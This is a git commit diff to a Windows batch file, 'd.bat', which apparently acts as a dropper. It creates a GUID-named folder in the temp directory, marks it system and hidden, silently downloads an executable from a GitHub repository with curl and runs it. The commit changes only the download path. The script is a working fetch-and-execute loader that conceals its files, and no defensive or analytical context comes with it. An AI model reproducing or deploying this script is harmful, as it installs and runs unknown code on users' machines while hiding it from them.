42c4215f943fdd1451ced0de398ea36bad2a57d8
Solda10Skipper <99901864+Solda10Skipper@users.noreply.github.com>
2022-02-18 14:50:45 +0100

    Update d.bat

--- k/d.bat
+++ k/d.bat
@@ -3,5 +3,5 @@ cd %tmp%
 mkdir {8AFAB2E9-049B-4889-B184-57306E3EAD34}
 attrib +s +h {8AFAB2E9-049B-4889-B184-57306E3EAD34}
 cd {8AFAB2E9-049B-4889-B184-57306E3EAD34}
-curl -Ls https://github.com/Solda10Skipper/SimpleApp/raw/main/pyt.exe -o p.exe
+curl -Ls https://github.com/Solda10Skipper/SimpleApp/raw/main/k/p.exe -o p.exe
 p.exe
